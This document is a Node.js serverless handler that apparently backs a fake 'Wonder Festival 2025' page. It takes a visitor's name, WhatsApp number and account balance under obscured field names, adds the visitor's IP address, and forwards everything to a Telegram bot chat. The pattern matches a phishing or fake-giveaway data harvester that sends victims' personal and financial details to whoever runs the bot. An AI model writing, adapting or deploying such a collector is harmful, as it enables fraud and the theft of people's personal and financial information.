const axios = require('axios');

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', 'https://cek-two.vercel.app');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method not allowed' });
  }

  try {
    const { a: name, b: phone, c: balance } = req.body;

    // Validasi input
    if (!name || !phone || !balance) {
      return res.status(400).json({ success: false, message: 'Semua field harus diisi' });
    }

    if (!/^08[0-9]{8,13}$/.test(phone)) {
      return res.status(400).json({ success: false, message: 'Nomor WhatsApp tidak valid' });
    }

    // Ambil token dari environment variables
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return res.status(500).json({ success: false, message: 'Server configuration error' });
    }

    // Dapatkan IP address pengguna
    const userIP = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   req.connection.remoteAddress || 
                   req.socket.remoteAddress ||
                   (req.connection.socket ? req.connection.socket.remoteAddress : null);

    // Format pesan untuk Telegram dengan informasi IP
    const telegramMessage = `
𝗪𝗼𝗻𝗱𝗲𝗿_𝗙𝗲𝘀𝘁𝗶𝘃𝗮𝗹𝟮𝟬𝟮𝟱
────────────────────
𝗡𝗮𝗺𝗮 | ${name}
𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 | <code>${phone}</code>
𝗦𝗮𝗹𝗱𝗼 | <pre>${balance}</pre>
────────────────────
𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀 | ${userIP || 'Tidak terdeteksi'}
    `;

    // Kirim ke Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: telegramMessage,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    });

    // Response sukses
    res.status(200).json({ success: true, message: 'Data berhasil dikirim' });

  } catch (error) {
    console.error('Error:', error.message);
    
    // Berikan pesan error yang lebih spesifik
    let errorMessage = 'Terjadi kesalahan server';
    if (error.response) {
      // Error dari Telegram API
      errorMessage = `Error Telegram: ${error.response.data.description || error.response.status}`;
    } else if (error.request) {
      // Tidak ada response dari Telegram
      errorMessage = 'Tidak dapat terhubung ke Telegram API';
    }
    
    res.status(500).json({ success: false, message: errorMessage });
  }
};
